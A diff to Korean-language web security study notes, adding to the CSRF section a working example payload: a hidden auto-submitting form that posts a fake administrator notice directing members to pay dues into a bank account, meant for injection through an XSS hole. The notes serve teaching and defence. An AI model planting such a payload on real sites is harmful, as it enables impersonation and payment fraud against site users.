@@ -129,7 +129,22 @@ XSS (크로스 사이트 스크립트)
 CSRF (크로스사이트 요청위조)
 -----------------------------------------
 
-상대방이 잘못된 요청을 보내도록 하는 사회공학적 해킹 기법이다. 이를 방어하기 위해서 write.html에서 **CSRF Token(난수)** 을 미리 발급하고 실제 요청할때 토큰을 포함시켜서 보내도록 한다. 이를 WAS의 CSRFInterceptor를 통해 검사하고 비지니스 로직을 수행한다.
+상대방이 잘못된 요청을 보내도록 하는 사회공학적 해킹 기법이다. 이를 방어하기 위해서 write.html에서 **CSRF Token(난수)** 을 미리 발급하고 실제 요청할때 토큰을 포함시켜서 보내도록 한다. 여러가지 재인증 기법을 사용하여 막을 수 있다. 이를 WAS의 CSRFInterceptor를 통해 검사하고 비지니스 로직을 수행한다.
+
+아래는 CSRF 공격 코드의 예시이다. XSS 취약점이 있는 게시판에 삽입하여 CSRF공격을 수행할 수 있다.
+
+.. code:: html
+	  
+	  <body>
+	  <form style="display:none" method="post" action="write.do" ENCTYPE="multipart/form-data">
+	  <input type="hidden" name="subject" value="회비 계좌 확인 요합니다">
+	  <input type="hidden" name="writer" value="관리자">
+	  <input type="hidden" name="writerId" value="admin">
+	  <input type="hidden" name="content" value="이번 모임의 회비 납부 안내입니다<br>국민은행 010 최창원">
+	  <input type="hidden" name="submit" id="send">
+	  </form>
+	  <script>document.forms[0].send.click();</script>
+	  </body>
 
 파일 업로드/다운로드 취약점
 ------------------------------------------------
@@ -154,8 +169,6 @@ Servlet 3.0부터 다음 메서드가 강화되면서 HTTP 응답 분할 공격�
 
 - addCookie()
 - setHeader()
-=======
-3. 위협 검토 ()
-4. 완화 방법 및 기술 식별
+
 
 
